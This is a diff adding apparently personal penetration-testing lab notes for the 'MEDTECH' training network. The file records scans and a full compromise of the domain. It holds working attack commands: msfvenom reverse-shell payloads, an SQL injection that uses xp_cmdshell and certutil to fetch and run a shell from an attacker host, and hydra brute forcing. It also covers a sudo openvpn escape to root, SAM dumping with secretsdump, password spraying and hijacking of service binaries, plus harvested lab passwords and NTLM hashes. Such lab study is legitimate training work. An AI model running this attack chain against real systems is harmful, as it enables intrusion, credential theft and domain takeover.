@@ -1,0 +1,248 @@
+Machine 120:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
+|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
+|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
+80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
+|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
+|_http-title: PAW! (PWK Awesome Website)
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Machine 121:
+Port: 80,135,139,445,5985
+
+Machine 122:
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
+|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
+1194/tcp open  openvpn?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+─$ nmap 172.16.173.10-14 172.16.173.82-83
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-24 11:49 +08
+Nmap scan report for 172.16.173.10
+Host is up (0.0066s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  wsman
+
+Nmap scan report for 172.16.173.11
+Host is up (0.014s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+
+Nmap scan report for 172.16.173.12
+Host is up (0.0028s latency).
+Not shown: 995 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5985/tcp open  wsman
+
+Nmap scan report for 172.16.173.13
+Host is up (0.0024s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+
+Nmap scan report for 172.16.173.14
+Host is up (0.00060s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 172.16.173.82
+Host is up (0.0023s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for 172.16.173.83
+Host is up (0.0026s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+
+Start in on 192.168.232.121 website, login page. WEB02
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4444 -f exe -o shell.exe
+$ python3 -m http.server 80
+';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.201/shell.exe c:/temp/shell.exe';--
+';exec xp_cmdshell 'c:/temp/shell.exe';--
+
+C:\Users>whoami /priv found SeImpersonatePrivilege
+upload GodPotato and nc. get a SYSTEM shell
+############################################################## 121 done
+net user /domain  found more users.
+joe                      
+krbtgt                   leon                     mario                    
+offsec                   peach                    wario                    
+yoshi
+
+upload mimikatz.exe but encounted UAC issue.
+mimikatz(commandline) # privilege::debug
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
+lsass.exe protected, so mimikatz no working.
+PS C:\TEMP> reg save HKLM\SAM sam
+reg save HKLM\SYSTEM system
+reg save HKLM\SECURITY security
+get these three file to Kali
+$ impacket-secretsdump -sam sam -system system -security security local
+MEDTECH.COM/joe:Flowers1
+Set up ligolo-ng
+
+hydra -l offsec -P /usr/share/wordlists/rockyou.txt -M ip.txt ssh
+[22][ssh] host: 192.168.173.122   login: offsec   password: password
+ssh offsec@192.168.173.122
+offsec:~$ sudo -l
+[sudo] password for offsec: 
+Matching Defaults entries for offsec on vpn:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User offsec may run the following commands on vpn:
+    (ALL : ALL) /usr/sbin/openvpn
+https://gtfobins.org/gtfobins/openvpn/#shell
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'
+# whoami
+root
+#################################################################### 122 done
+Found user mario in machine 122 with .ssh and only machine 14 have port 22 open.
+$ ssh -i id_rsa mario@172.16.173.14
+##################################################################### 14 done
+$ nxc winrm 172.16.173.10-14 -u 'joe' -p 'Flowers1'
+WINRM       172.16.173.11   5985   FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
+Get in with Administrator privilege.
+*Evil-WinRM* PS C:\Users\joe\Documents> cat fileMonitorBackup.log | sls 'backup'
+
+   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e
+   88605 Oct 04 11:21  Backup      toad                         6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068
+   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e
+   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
+##################################################################### 11 done
+hashcat for wario NTLM hash. Found credentials wario:Mushroom!
+$ nxc winrm 172.16.173.83 -u wario -p 'Mushroom!'
+WINRM       172.16.173.83   5985   CLIENT02         [+] medtech.com\wario:Mushroom! (Pwn3d!)
+Evil-winrm in. upload winPEASany.exe. Found:
+auditTracker(auditTracker)[C:\DevelopmentExecutables\auditTracker.exe] - Autoload - isDotNet
+    File Permissions: Everyone [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles]                                                                                                 
+    Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables (Everyone [Allow: AllAccess], Authenticated Users [Allow: WriteData/CreateFiles])
+
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4444 -f exe -o auditTracker.exe
+
+upload to C:\DevelopmentExecutables
+run sc.exe start auditTracker
+get a reverse shell with SYSTEM privilege
+##################################################################### 83 done
+make users list and passwords list based on current finding.
+$ nxc smb 172.16.173.82 -u users.txt -p pass.txt --continue-on-success
+Found yoshi with Mushroom! password can access to 10-13 and 83
+[+] medtech.com\yoshi:Mushroom! 
+$ impacket-psexec yoshi:'Mushroom!'@172.16.173.82
+Found have Administrator privilege. also found credential like file.
+PS C:\Users\Administrator.MEDTECH\Searches> cat hole.txt
+leon:rabbit!:)
+
+##################################################################### 82 done
+saw port 3389 open on machine 12.
+$ xfreerdp3 /u:yoshi /p:'Mushroom!' /v:172.16.173.12
+find backup.exe in C:\temp. 
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4444 -f exe -o backup.exe
+replace it. then get a SYSTEM shell after few minutes on port 4444.
+reg save sam system security
+##################################################################### 12 done
+$ impacket-secretsdump -sam sam -system system -security security local
+get leon:rabbit:)
+
+$ nxc winrm 172.16.173.10-13 -u 'leon' -p 'rabbit:)'
+WINRM       172.16.173.13   5985   PROD01           [-] medtech.com\leon:rabbit:)
+$ nxc winrm 172.16.173.13 -u leon -p 'rabbit:)'
+WINRM       172.16.173.13   5985   PROD01           [+] medtech.com\leon:rabbit:) (Pwn3d!)
+
+evil-winrm in with SYSTEM privilege. 
+##################################################################### 13 done
+$ nxc winrm 172.16.173.10 -u 'leon' -p 'rabbit:)'
+WINRM       172.16.173.10   5985   DC01             [+] medtech.com\leon:rabbit:) (Pwn3d!)
+
+EvilWinRM in with SYSTEM privilege. Find creds file.
+cat credentials.txt
+web01: offsec/century62hisan51
+
+##################################################################### 10 done
+Machine 120 jam somehow, try many way and found just revert the machine, then done.
+ssh offsec@192.168.173.120 
+century62hisan51
+found sudo -l show All
+su root
+direct root
+################################################################### 120 done
+Credentials:
+joe:Flowers1
+offsec:password
+mario id_rsa
+wario:Mushroom!
+yoshi:Mushroom!
+leon:rabbit:)
+web01: offsec/century62hisan51
+#######################################################################
+users: offsec
+Administrator
+joe                    
+leon
+mario
+peach
+wario
+yoshi
+goomba
+daisy
+toad
+#######################################################################
+Quick Summary of your Lab Path:
+Foothold: SQLi -> xp_cmdshell -> SeImpersonate (SYSTEM).
+
+Loot: SAM/SYSTEM dump -> joe:Flowers1.
+
+Lateral: WinRM to .11 -> Log analysis -> NTLM hashes.
+
+PrivEsc: Writable binaries (auditTracker.exe and backup.exe).
+
+DC Capture: Leon's creds -> DC01 -> Full Domain Admin.
+
+
+
+
+
+
